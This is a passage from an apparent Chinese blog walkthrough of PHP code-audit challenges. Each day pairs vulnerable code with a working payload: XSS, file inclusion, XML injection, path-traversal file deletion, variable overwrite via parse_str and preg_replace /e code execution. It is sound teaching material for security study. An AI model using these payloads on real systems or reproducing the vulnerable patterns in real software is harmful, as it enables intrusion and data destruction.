class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array(<span class="keyword">$this</span>-&gt;file[<span class="string">'name'</span>], <span class="keyword">$this</span>-&gt;whitelist,<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure><p>修改以后再尝试1demo.php文件，上传失败</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/PHP-Security/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Day02"><a href="#Day02" class="headerlink" title="Day02"></a>Day02</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// composer require "twig/twig"</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $twig;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $indexTemplate = <span class="string">'&lt;img '</span> .</span><br><span class="line">            <span class="string">'src="https://loremflickr.com/320/240"&gt;'</span> .</span><br><span class="line">            <span class="string">'&lt;a href="&#123;&#123;link|escape&#125;&#125;"&gt;Next slide »&lt;/a&gt;'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Default twig setup, simulate loading</span></span><br><span class="line">        <span class="comment">// index.html file from disk</span></span><br><span class="line">        $loader = <span class="keyword">new</span> Twig\Loader\ArrayLoader([</span><br><span class="line">            <span class="string">'index.html'</span> =&gt; $indexTemplate</span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;twig = <span class="keyword">new</span> Twig\Environment($loader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNexSlideUrl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $nextSlide = $_GET[<span class="string">'nextSlide'</span>];</span><br><span class="line">        <span class="keyword">return</span> filter_var($nextSlide, FILTER_VALIDATE_URL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;twig-&gt;render(</span><br><span class="line">            <span class="string">'index.html'</span>,</span><br><span class="line">            [<span class="string">'link'</span> =&gt; <span class="keyword">$this</span>-&gt;getNexSlideUrl()]</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> Template())-&gt;render();</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这关涉及了PHP的Twig模板语言，起到了渲染的作用。我们不需要过多的关注这个模板，我们需要关注的是我们可以控制的变量是$nextSlide，这个变量经过了一个函数<strong>filter_var</strong>的处理，这个函数的作用是根据指定过滤器的ID号对传入的参数进行过滤，这里过滤器ID号为<strong>FILTER_VALIDATE_URL</strong>，所以整个函数的作用是检查变量$nextSlide是否是一个合法的URL，我们可以写一个测试文件测试一下具体的检测流程：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">var_dump(filter_var(<span class="string">"http://www.baidu.com"</span>,FILTER_VALIDATE_URL)); <span class="comment">#string(20) "http://www.baidu.com" </span></span><br><span class="line">var_dump(filter_var(<span class="string">"www.baidu.com"</span>,FILTER_VALIDATE_URL)); <span class="comment">#bool(false) </span></span><br><span class="line">var_dump(filter_var(<span class="string">"123://www.baidu.com"</span>,FILTER_VALIDATE_URL)); <span class="comment">#string(19) "123://www.baidu.com" </span></span><br><span class="line">var_dump(filter_var(<span class="string">"123://123.com"</span>,FILTER_VALIDATE_URL)); <span class="comment">#string(13) "123://123.com" </span></span><br><span class="line">var_dump(filter_var(<span class="string">"123://123"</span>,FILTER_VALIDATE_URL)); <span class="comment">#string(9) "123://123" </span></span><br><span class="line">var_dump(filter_var(<span class="string">"123:/123"</span>,FILTER_VALIDATE_URL)); <span class="comment">#bool(false) </span></span><br><span class="line">var_dump(filter_var(<span class="string">"123://"</span>,FILTER_VALIDATE_URL)); <span class="comment">#bool(false) </span></span><br><span class="line">var_dump(filter_var(<span class="string">"1://1"</span>,FILTER_VALIDATE_URL)); <span class="comment">#string(5) "1://1" </span></span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>经过测试发现具体只是检测变量中是否存在<strong>“://“</strong></p><p>过滤的URL再经过Twig的<strong>escape</strong>过滤后再渲染，查阅Twig的官方文档</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Internally, ``escape`` uses the PHP native `htmlspecialchars`_ function for the HTML escaping strategy.</span><br></pre></td></tr></table></figure><p>escape的过滤规则和<strong>htmlspecialchars</strong>函数过滤规则相同，会将单引号和双引号进行编码</p><p>经过这两个过滤后的URL会在页面中显示，见第9-11行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$indexTemplate = <span class="string">'&lt;img '</span> .</span><br><span class="line">            <span class="string">'src="https://loremflickr.com/320/240"&gt;'</span> .</span><br><span class="line">            <span class="string">'&lt;a href="&#123;&#123;link|escape&#125;&#125;"&gt;Next slide »&lt;/a&gt;'</span>;</span><br></pre></td></tr></table></figure><p>那么这关就存在<strong>XSS</strong>漏洞，我们知道在javascript中<strong>“//“</strong>是表示注释，<strong>“%250a”和”%0a”</strong>在浏览器中表示换行，那么我们就可以构造一下payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?nextSlide=javascript://comment%250aalert(/xss/)</span><br></pre></td></tr></table></figure><p>因为<strong>“//“</strong>表示注释，所以<strong>comment</strong>被注释，换行后执行<strong>alert(/xss/)</strong>，即执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascript://comment</span><br><span class="line">alert(/xss/)</span><br></pre></td></tr></table></figure><p>执行效果如下图所示</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/PHP-Security/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功进行XSS注入攻击</p><h2 id="Day03"><a href="#Day03" class="headerlink" title="Day03"></a>Day03</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span><span class="params">($className)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">include</span> $className;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$controllerName = $_GET[<span class="string">'c'</span>];</span><br><span class="line">$data = $_GET[<span class="string">'d'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (class_exists($controllerName)) &#123;</span><br><span class="line">    $controller = <span class="keyword">new</span> $controllerName($data[<span class="string">'t'</span>], $data[<span class="string">'v'</span>]);</span><br><span class="line">    $controller-&gt;render();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'There is no page with this name'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeController</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $template;</span><br><span class="line">    <span class="keyword">private</span> $variables;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($template, $variables)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;template = $template;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;variables = $variables;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;variables[<span class="string">'new'</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'controller rendering new response'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'controller rendering old response'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这关涉及到了PHP的魔术方法<strong>__autoload</strong>，用于自动加载类，当一个类被实例化时，会自动调用该方法，方法中使用<strong>include</strong>进行调用实例化类的文件，常用于节约<strong>include</strong>方法的使用。</p><p>当然，还有许多函数方法被调用时也会自动调用<strong>__autoload</strong>方法，如第9行中的<strong>class_exists</strong>方法，它用来判断类名是否存在，除此之外还有以下方法也会自动调用<strong>__autoload</strong>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">call_user_func()</span><br><span class="line">call_user_func_array()</span><br><span class="line">class_exists()</span><br><span class="line">class_implements()</span><br><span class="line">class_parents()</span><br><span class="line">class_uses()</span><br><span class="line">get_class_methods()</span><br><span class="line">get_class_vars()</span><br><span class="line">get_parent_class()</span><br><span class="line">interface_exists()</span><br><span class="line">is_a()</span><br><span class="line">is_callable()</span><br><span class="line">is_subclass_of()</span><br><span class="line">method_exists()</span><br><span class="line">property_exists()</span><br><span class="line">spl_autoload_call()</span><br><span class="line">trait_exists()</span><br></pre></td></tr></table></figure><p>仔细观察<strong>class_exists()</strong>方法传入的参数是通过GET方式传入，可控，传入的参数即调用的文件名，这就造成了<strong>任意文件包含</strong>漏洞</p><p>输入<code>?c=./demo2.php</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/PHP-Security/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Day04"><a href="#Day04" class="headerlink" title="Day04"></a>Day04</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;loginViaXml($user, $pass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loginViaXml</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            $user != <span class="keyword">false</span> &amp;&amp; $pass != <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">            (!strpos($user, <span class="string">'&lt;'</span>) || !strpos($user, <span class="string">'&gt;'</span>)) &amp;&amp;</span><br><span class="line">            (!strpos($pass, <span class="string">'&lt;'</span>) || !strpos($pass, <span class="string">'&gt;'</span>))</span><br><span class="line">        ) &#123;</span><br><span class="line">            $format = <span class="string">'&lt;?xml version="1.0"?&gt;'</span> .</span><br><span class="line">                      <span class="string">'&lt;user v="%s"/&gt;&lt;pass v="%s"/&gt;'</span>;</span><br><span class="line">            $xml = sprintf($format, $user, $pass);</span><br><span class="line">            $xmlElement = <span class="keyword">new</span> SimpleXMLElement($xml);</span><br><span class="line">            <span class="comment">// Perform the actual login.</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;login($xmlElement);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Login($_POST[<span class="string">'username'</span>], $_POST[<span class="string">'password'</span>]);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题目的是为了进行XML注入，对于<code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;user v=&quot;%s&quot;/&gt;&lt;pass v=&quot;%s&quot;/&gt;</code>就必须要进行闭合标签的处理，而条件<code>(!strpos($user, &#39;&lt;&#39;) || !strpos($user, &#39;&gt;&#39;)) &amp;&amp;(!strpos($pass, &#39;&lt;&#39;) || !strpos($pass, &#39;&gt;&#39;))</code>本意是不允许我们对变量$user和变量$pass同时输入<code>&lt;&gt;</code>，但是我们知道<strong>strpos</strong>函数搜索不到目标时返回的是<strong>false</strong>，当找到目标在第一位时返回的是<strong>0</strong>，根据PHP弱类型比较，<strong>0</strong>和<strong>false</strong>是相等的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(strpos(<span class="string">"abcd"</span>,<span class="string">"a"</span>)); <span class="comment"># 0</span></span><br><span class="line">var_dump(strpos(<span class="string">"abcd"</span>,<span class="string">"x"</span>)); <span class="comment"># false</span></span><br><span class="line">var_dump(<span class="number">0</span>==<span class="keyword">false</span>); <span class="comment"># true</span></span><br></pre></td></tr></table></figure><p>所以我们传入的$user和$pass第一位是<code>&lt;</code>或者<code>&gt;</code>即可绕过过滤，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;&amp;password=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;</span><br></pre></td></tr></table></figure><p>最终传入<code>$this-&gt;login($xmlElement)</code>的<code>$xmlElement</code>值是<code>&lt;xml&gt;&lt;user=&quot;&lt;&quot;&gt;&lt;injected-tag property=&quot;&quot;/&gt;&lt;pass=&quot;&lt;&quot;&gt;&lt;injected-tag property=&quot;&quot;/&gt;&lt;/xml&gt;</code> 就可以注入了</p><h2 id="Day06"><a href="#Day06" class="headerlink" title="Day06"></a>Day06</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TokenStorage</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">performAction</span><span class="params">($action, $data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> ($action) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'create'</span>:</span><br><span class="line">                <span class="keyword">$this</span>-&gt;createToken($data);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'delete'</span>:</span><br><span class="line">                <span class="keyword">$this</span>-&gt;clearToken($data);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="comment">//throw new Exception('Unknown action');</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'Unknown action'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createToken</span><span class="params">($seed)</span> </span>&#123;</span><br><span class="line">        $token = md5($seed);</span><br><span class="line">        file_put_contents(<span class="string">'/tmp/tokens/'</span> . $token, <span class="string">'...data'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearToken</span><span class="params">($token)</span> </span>&#123;</span><br><span class="line">        $file = preg_replace(<span class="string">"/[^a-z.-_]/"</span>, <span class="string">""</span>, $token);</span><br><span class="line">        unlink(<span class="string">'./tmp/tokens/'</span> . $file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$storage = <span class="keyword">new</span> TokenStorage();</span><br><span class="line">$storage-&gt;performAction($_GET[<span class="string">'action'</span>], $_GET[<span class="string">'data'</span>]);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题可以利用的函数有<strong>file_put_contents</strong>和<strong>unlink</strong>，但是file_put_contents函数的参数$token经过md5加密，不好利用，在观察unlink函数，参数$token经过<strong>preg_replace</strong>函数进行正则匹配过滤，过滤的规则是<code>&quot;/[^a-z.-_]/&quot;</code>，本意应该是除了<code>a-z 和 . 和 - 和 _</code>的字符都被替换为空，但是这里的<code>-</code>是没有被转义的，在<code>[]</code>中<code>-</code>是表示范围的意思，所以这里过滤的应该是除了ascii46-95 , 97-122的字符。也就是说<code>.</code>和<code>/</code>字符都不会被过滤，那么我们就可以利用路径穿越进行任意文件删除</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=delete&amp;data=../../demo2.php</span><br></pre></td></tr></table></figure><h2 id="Day07"><a href="#Day07" class="headerlink" title="Day07"></a>Day07</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUser</span><span class="params">($id)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $config, $db;</span><br><span class="line">    <span class="keyword">if</span>($id == <span class="keyword">false</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!is_resource($db)) &#123;</span><br><span class="line">        $db = <span class="keyword">new</span> MySQLi(</span><br><span class="line">            $config[<span class="string">'dbhost'</span>],</span><br><span class="line">            $config[<span class="string">'dbuser'</span>],</span><br><span class="line">            $config[<span class="string">'dbpass'</span>],</span><br><span class="line">            $config[<span class="string">'dbname'</span>]</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    $sql = <span class="string">"SELECT username FROM users WHERE id = ?"</span>;</span><br><span class="line">    $stmt = $db-&gt;prepare($sql);</span><br><span class="line">    $stmt-&gt;bind_param(<span class="string">'i'</span>, $id);</span><br><span class="line">    $stmt-&gt;bind_result($name);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $stmt-&gt;fetch();</span><br><span class="line">    <span class="keyword">return</span> $name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$var = parse_url($_SERVER[<span class="string">'HTTP_REFERER'</span>]);</span><br><span class="line">parse_str($var[<span class="string">'query'</span>]);</span><br><span class="line">$currentUser = getUser($id);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;h1&gt;'</span>.htmlspecialchars($currentUser).<span class="string">'&lt;/h1&gt;'</span>;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这关考察的通过<strong>parse_url</strong>和<strong>parse_str</strong>函数导致的<strong>变量覆盖</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$var = parse_url(<span class="string">"https://127.0.0.1/?a=1&amp;b=2"</span>);</span><br><span class="line">print_r($var); <span class="comment">#Array ( [scheme] =&gt; https [host] =&gt; 127.0.0.1 [path] =&gt; / [query] =&gt; a=1,b=2 )</span></span><br><span class="line">parse_str($var[<span class="string">'query'</span>]); <span class="comment"># $a == 1 , $b == 2</span></span><br></pre></td></tr></table></figure><p>parse_url中的参数来自HTTP请求头部的<code>Referer</code>字段，是可控的，那么我们就可以控制<strong>getUser</strong>类中的$config和$db来在我们自己构造的数据库中进行查询</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/html/day7.php?config[dbhost]=127.0.0.1&amp;config[dbuser]=root&amp;config[dbpass]=root&amp;config[dbname]=security&amp;id=1</span><br></pre></td></tr></table></figure><h2 id="Day08"><a href="#Day08" class="headerlink" title="Day08"></a>Day08</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET) || $_GET == <span class="keyword">false</span>)&#123;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complexStrtolower</span><span class="params">($regex, $value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $regex . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $value</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $regex =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complexStrtolower($regex, $value) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考察的是<strong>preg_replace/e</strong>函数导致的<strong>命令执行</strong>漏洞，我之前的文章（<a href="https://foxgrin.github.io/posts/41464/">代码审计-通过preg_replace函数深入命令执行</a>）有详细写到过这题</p><p>主要思路就是通过GET方式传入的变量名作为正则匹配条件，将匹配的值value传递到strtolower函数中进行命令执行，<code>&quot;\\1&quot;</code>即为第一个匹配到的字符串。</p><p>Payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*=&#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure><p><code>\S</code>代表除空白符以外的所有字符，控制$value所有字符都会被匹配到，<code>{${phpinfo()}}</code>则涉及到PHP双引号下的变量会被解析和PHP可变变量</p><h2 id="Day09"><a href="#Day09" class="headerlink" title="Day09"></a>Day09</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LanguageManager</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadLanguage</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $lang = <span class="keyword">$this</span>-&gt;getBrowserLanguage();</span><br><span class="line">        $sanitizedLang = <span class="keyword">$this</span>-&gt;sanitizeLanguage($lang);</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="string">"./lang/$sanitizedLang"</span>))&#123;</span><br><span class="line">        <span class="keyword">require_once</span>(<span class="string">"./lang/$sanitizedLang"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">getBrowserLanguage</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $lang = <span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_ACCEPT_LANGUAGE'</span>]) ? $_SERVER[<span class="string">'HTTP_ACCEPT_LANGUAGE'</span>] :<span class="string">'en'</span>;</span><br><span class="line">        <span class="keyword">return</span> $lang;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeLanguage</span><span class="params">($language)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> str_replace(<span class="string">'../'</span>, <span class="string">''</span>, $language);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$manage = <span class="keyword">new</span> LanguageManager();</span><br><span class="line">$manage-&gt;loadLanguage();</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>考察的是任意<strong>文件包含</strong>漏洞，参数<code>$_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;]</code>可控，过滤函数<strong>str_replace</strong>只对<code>../</code>做一次过滤，双写即可绕过，Payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept-Language: 